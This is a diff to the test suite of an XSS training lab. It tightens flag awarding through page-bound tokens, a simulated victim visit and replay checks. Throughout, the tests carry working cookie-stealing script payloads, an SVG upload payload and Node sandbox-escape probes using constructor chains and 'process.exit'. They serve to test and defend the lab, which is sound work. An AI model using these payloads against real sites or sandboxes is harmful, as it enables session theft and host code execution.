@@ -76,6 +76,8 @@ function makeBrowser(cookie, { hash = '', search = '' } = {}) {
     el, calls, errors, run,
     runPage: (html) => liveScripts(html).forEach(run),
     beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
+    // The page-bound token as the page's own script computed it at load.
+    token: () => ctx.window.__px,
   };
 }
 
@@ -143,11 +145,11 @@ test('xss module', async (t) => {
     },
     async stored(c) {
       await c.post('/xss/guestbook', { author: 'mallory', body: `<script>${beaconJs('stored')}</script>` });
-      const page = await c.get('/xss/guestbook');
-      const b = makeBrowser(c.cookie());
-      b.runPage(page.text);
-      assert.deepEqual(b.errors, []);
-      return deliver(c, b);
+      // The flag is awarded through the victim-visit flow: the server loads
+      // the guestbook as a victim and the stored payload fires there.
+      const visit = await c.get('/xss/victim-visit');
+      assert.equal(visit.status, 200);
+      return { status: 200, text: visit.text };
     },
     async dom(c) {
       const page = await c.get('/xss/dom');
@@ -176,7 +178,8 @@ test('xss module', async (t) => {
       return deliver(c, b);
     },
     async 'xss-svg-upload'(c) {
-      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[${beaconJs('xss-svg-upload', "new URLSearchParams(location.search).get('n')")}]]></script></svg>`;
+      const COMBINE = "(function(){var p=new URLSearchParams(location.search);var a=p.get('pxa')||'',k=p.get('pxk')||'',t='';for(var i=0;i+1<a.length&&i+1<k.length;i+=2){t+=String.fromCharCode(parseInt(a.substr(i,2),16)^parseInt(k.substr(i,2),16));}return t;})()";
+      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+${COMBINE})]]></script></svg>`;
       const up = await c.post('/xss/svg', { name: 'evil', svg });
       assert.equal(up.status, 302);
       const loc = up.headers.get('location');
@@ -243,7 +246,13 @@ test('xss module', async (t) => {
       if (path !== '/xss' && path !== '/xss/clobber' && path !== '/xss/clobber-admin') {
         assert.ok(r.text.includes('How to claim this flag'), `${path}: claim box`);
         assert.match(r.text, /data-status-url="\/xss\/claim-status\?v=[a-z-]+"/, `${path}: status url`);
-        assert.match(r.text, /window\.__px="[0-9a-f]{32}"/, `${path}: page token`);
+        // The raw token never appears in the page source: only share arrays.
+        const b = makeBrowser(c.cookie());
+        b.runPage(r.text);
+        const executed = b.token();
+        assert.match(executed, /^[0-9a-f]{32}$/, `${path}: executed token`);
+        assert.ok(!r.text.includes(executed), `${path}: raw token must not appear in HTML`);
+        assert.match(r.text, /__tkA=\[[0-9,]+\]/, `${path}: share arrays`);
       }
     }
     // Pages that only exist after an action.
@@ -275,14 +284,20 @@ test('xss module', async (t) => {
     assert.equal((await c.get('/xss/collect?c=x&v=nope&n=1')).status, 400);
     assert.deepEqual(await c.get('/xss/claim-status?v=nope').then((r) => r.status), 400);
     // A real token, but for another challenge or with no data, earns nothing.
+    // Tokens are obtained by executing the page's script, never by scraping.
+    const pageTok = (html) => {
+      const b = makeBrowser(c.cookie());
+      b.runPage(html);
+      return b.token();
+    };
     const page = await c.get('/xss/search');
-    const tok = page.text.match(/window\.__px="([0-9a-f]{32})"/)[1];
-    assert.equal((await c.get(`/xss/collect?c=x&v=stored&n=${tok}`)).status, 400, 'token is bound to its challenge');
+    const tok = pageTok(page.text);
+    assert.equal((await c.get(`/xss/collect?c=x&v=stored&n=${tok}`)).status, 400, 'stored is victim-visit only');
     assert.equal((await c.get(`/xss/collect?c=&v=reflected&n=${tok}`)).status, 400, 'empty data');
     assert.equal((await c.get(`/xss/collect?v=reflected&n=${tok}`)).status, 400, 'missing data');
     // Another student's token is useless in this session.
     const other = fresh();
-    const otherTok = (await other.get('/xss/search')).text.match(/window\.__px="([0-9a-f]{32})"/)[1];
+    const otherTok = pageTok((await other.get('/xss/search')).text);
     assert.equal((await c.get(`/xss/collect?c=x&v=reflected&n=${otherTok}`)).status, 400, 'foreign token');
     // None of those consumed the real token: the genuine beacon still works.
     const ok = await c.get(`/xss/collect?c=x&v=reflected&n=${tok}`);
@@ -295,6 +310,20 @@ test('xss module', async (t) => {
     assert.equal((await c.get('/xss/claim-status?v=stored')).body.captured, false);
     assert.equal((await c.get('/xss/claim-status?v=reflected')).text.match(FLAG_RE), null);
     assert.equal((await c.get('/xss/collect?c=x&v=xss-dom-clobber&n=anything')).status, 400, 'clobber is not beacon-awarded');
+  });
+
+  await t.test('collector: scraped shares cannot forge a beacon token', async () => {
+    const c = fresh();
+    const page = await c.get('/xss/search');
+    // The only token-shaped data in the HTML are the random share arrays.
+    const shares = page.text.match(/__tkA=\[([0-9,]+)\]/);
+    assert.ok(shares, 'share arrays must be present');
+    const forged = await c.get(`/xss/collect?c=x&v=reflected&n=${encodeURIComponent(shares[1])}`);
+    assert.equal(forged.status, 400, 'share array is not the token');
+    assert.deepEqual(await heldFlags(c), []);
+    const b = makeBrowser(c.cookie());
+    b.runPage(page.text);
+    assert.ok(!page.text.includes(b.token()), 'executed token absent from HTML');
   });
 
   await t.test('reflected: script in the search term earns the flag; alert, plain text and a page-less beacon do not', async () => {
@@ -316,7 +345,7 @@ test('xss module', async (t) => {
     assert.equal((await heldFlags(c)).filter((s) => s === 'xss:Reflected XSS').length, 1, 'no double count');
   });
 
-  await t.test('stored: benign posts earn nothing, the stored payload fires on reload', async () => {
+  await t.test('stored: benign posts earn nothing, the stored payload fires for a victim', async () => {
     const c = fresh();
     const bad = await c.get('/xss/collect?c=session&v=stored');
     assert.equal(bad.status, 400);
@@ -327,12 +356,29 @@ test('xss module', async (t) => {
     const b = makeBrowser(c.cookie());
     b.runPage(page.text);
     assert.deepEqual(b.beacons(), []);
+    // A victim visit with no payload stored earns nothing.
+    const idleVisit = await c.get('/xss/victim-visit');
+    assert.equal(idleVisit.status, 200);
+    assert.ok(!idleVisit.text.includes(flagOf('stored')), 'visit without payload must not award');
     assert.equal(await has(c, 'stored'), false);
     const hit = await exploits.stored(c);
     assert.ok(hit.text.includes(flagOf('stored')));
     assert.ok(await has(c, 'stored'));
     await exploits.stored(c);
     assert.equal((await heldFlags(c)).filter((s) => s === 'xss:Stored XSS').length, 1);
+  });
+
+  await t.test('stored: a beacon fired from the attacker own session is rejected', async () => {
+    const c = fresh();
+    await c.post('/xss/guestbook', { author: 'mallory', body: `<script>${beaconJs('stored')}</script>` });
+    const page = await c.get('/xss/guestbook');
+    const b = makeBrowser(c.cookie());
+    b.runPage(page.text);
+    assert.deepEqual(b.errors, []);
+    assert.ok(b.beacons().length >= 1, 'payload fires in the attacker browser, as before');
+    const selfHit = await deliver(c, b);
+    assert.equal(selfHit.status, 400, 'self-fired beacon must be rejected');
+    assert.equal(await has(c, 'stored'), false);
   });
 
   await t.test('dom: the fragment payload fires in the browser; the server never sees it; script tags and plain text do not', async () => {
@@ -426,16 +472,18 @@ test('xss module', async (t) => {
     assert.equal((await c.post('/xss/svg', { name: 'x', svg: 'just text' })).status, 400);
     assert.equal(await has(c, 'xss-svg-upload'), false);
 
-    // A script that cannot read the token (file opened without ?n=) is rejected.
+    // A script that cannot rebuild the token (file opened without the share
+    // parameters) is rejected.
+    const COMBINE = "(function(){var p=new URLSearchParams(location.search);var a=p.get('pxa')||'',k=p.get('pxk')||'',t='';for(var i=0;i+1<a.length&&i+1<k.length;i+=2){t+=String.fromCharCode(parseInt(a.substr(i,2),16)^parseInt(k.substr(i,2),16));}return t;})()";
     const up = await c.post('/xss/svg', {
       name: 'noconfig',
-      svg: svgOf(`<script><![CDATA[${beaconJs('xss-svg-upload', "new URLSearchParams(location.search).get('n')")}]]></script>`),
+      svg: svgOf(`<script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+${COMBINE})]]></script>`),
     });
     const file = up.headers.get('location').split('?')[0];
     const body = (await c.get(file)).text;
     const b = makeBrowser(c.cookie(), { search: '' });
     b.run(body.match(/CDATA\[([\s\S]*?)\]\]>/)[1]);
-    assert.equal((await deliver(c, b)).status, 400, 'no token in the file URL');
+    assert.equal((await deliver(c, b)).status, 400, 'no shares in the file URL');
     assert.equal(await has(c, 'xss-svg-upload'), false);
 
     // A documented-style payload with a bare & is not well-formed XML, so a browser would refuse to run it.
@@ -564,4 +612,95 @@ test('xss module', async (t) => {
     assert.equal(new Set(got).size, 9);
     for (const id of IDS) assert.ok(got.includes(`xss:${NAMES[id]}`), id);
   });
+});
+
+// ---------------------------------------------------------------------------
+// A1B adversarial negatives (appended): cross-vuln token misuse, beacon
+// replay, and a stored payload that hardcodes the attacker token instead of
+// reading the victim page token at runtime.
+// ---------------------------------------------------------------------------
+function a1bToken(html) {
+  const code = liveScripts(html).find((s) => s.includes('__tkA'));
+  assert.ok(code, 'nonce share script must be present');
+  const ctx = { window: {} };
+  vm.createContext(ctx);
+  vm.runInContext(code, ctx, { timeout: 1000 });
+  return ctx.window.__px;
+}
+
+test('xss A1B adversarial negatives', async (t) => {
+  const { srv, dataDir } = await bootLab(t);
+  const flagOf = (id) => flagFromDb(dataDir, 'xss', id);
+
+  await t.test('cross-vuln token earns nothing and is not consumed; replay earns nothing', async () => {
+    const c = client(srv.base);
+    const page = await c.get('/xss/search');
+    const tok = a1bToken(page.text);
+    assert.match(tok, /^[0-9a-f]{32}$/, 'page script must compute the token');
+    assert.ok(!page.text.includes(tok), 'raw token must not appear in HTML');
+    assert.equal((await c.get('/xss/collect?c=x&v=dom&n=' + tok)).status, 400, 'reflected token must not award dom');
+    assert.equal((await c.get('/xss/collect?c=x&v=xss-js-context&n=' + tok)).status, 400, 'reflected token must not award js-context');
+    const ok = await c.get('/xss/collect?c=x&v=reflected&n=' + tok);
+    assert.equal(ok.status, 200, 'cross-vuln attempts must not consume the token');
+    assert.ok(ok.text.includes(flagOf('reflected')));
+    assert.equal((await c.get('/xss/collect?c=x&v=reflected&n=' + tok)).status, 400, 'replayed beacon must not award');
+  });
+
+  await t.test('stored: a payload hardcoding the attacker token fails the victim visit', async () => {
+    const c = client(srv.base);
+    const gb = await c.get('/xss/guestbook');
+    const own = a1bToken(gb.text);
+    assert.match(own, /^[0-9a-f]{32}$/);
+    await c.post('/xss/guestbook', { author: 'a1b-bad', body: "<script>fetch('/xss/collect?c=x&v=stored&n=" + own + "')</script>" });
+    const visit = await c.get('/xss/victim-visit');
+    assert.ok(!visit.text.includes(flagOf('stored')), 'hardcoded attacker token must not win the victim visit');
+    assert.equal((await c.get('/xss/claim-status?v=stored')).body.captured, false);
+    // The honest payload reads the page token at runtime inside the victim.
+    await c.post('/xss/guestbook', { author: 'a1b-good', body: "<script>fetch('/xss/collect?c='+document.cookie+'&v=stored&n='+window.__px)</script>" });
+    const visit2 = await c.get('/xss/victim-visit');
+    assert.ok(visit2.text.includes(flagOf('stored')), 'runtime-token payload must win the victim visit');
+    assert.equal((await c.get('/xss/claim-status?v=stored')).body.captured, true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Gate regression (2026-10-20, supervision blocking item 1): the simulated
+// victim in modules/xss/challenges/stored.js must run stored scripts in a
+// sandbox built from guest-realm intrinsics only (the lib/fix-worker.js
+// pattern). Each probe below fires its beacon ONLY if it reached the host
+// process through a host-realm .constructor chain, so before the fix these
+// payloads won the victim visit (and could run arbitrary host code, e.g.
+// process.exit). After the fix the verdict inside the guest is "undefined",
+// no beacon fires, and the server stays alive. The honest runtime-token
+// payload must still win.
+// ---------------------------------------------------------------------------
+test('xss stored: victim-visit sandbox cannot reach the host realm', async (t) => {
+  const { srv, dataDir } = await bootLab(t);
+  const flagOf = (id) => flagFromDb(dataDir, 'xss', id);
+  const c = client(srv.base);
+
+  const chains = ['URLSearchParams', 'fetch', 'console.constructor'];
+  for (let i = 0; i < chains.length; i++) {
+    const probe = `<script>try{var t=(${chains[i]}).constructor('return typeof process')();` +
+      `if(t==='object'){fetch('/xss/collect?c=HOSTESCAPE&v=stored&n='+window.__px)}}catch(e){}</script>`;
+    await c.post('/xss/guestbook', { author: 'escape-probe-' + i, body: probe });
+  }
+  const visit = await c.get('/xss/victim-visit');
+  assert.equal(visit.status, 200);
+  assert.ok(!visit.text.includes(flagOf('stored')), 'host-escape probes must not win the victim visit');
+  assert.equal((await c.get('/xss/claim-status?v=stored')).body.captured, false);
+
+  // A kill attempt through the same chain must leave the lab process alive.
+  await c.post('/xss/guestbook', {
+    author: 'escape-kill',
+    body: "<script>try{URLSearchParams.constructor('return process.exit(42)')()}catch(e){}</script>",
+  });
+  const visitAlive = await c.get('/xss/victim-visit');
+  assert.equal(visitAlive.status, 200, 'victim visit must survive a process.exit escape attempt');
+
+  // The honest payload still fires its beacon with the victim secret.
+  await c.post('/xss/guestbook', { author: 'honest', body: "<script>fetch('/xss/collect?c='+document.cookie+'&v=stored&n='+window.__px)</script>" });
+  const visit2 = await c.get('/xss/victim-visit');
+  assert.ok(visit2.text.includes(flagOf('stored')), 'honest payload must still win the victim visit');
+  assert.equal((await c.get('/xss/claim-status?v=stored')).body.captured, true);
 });
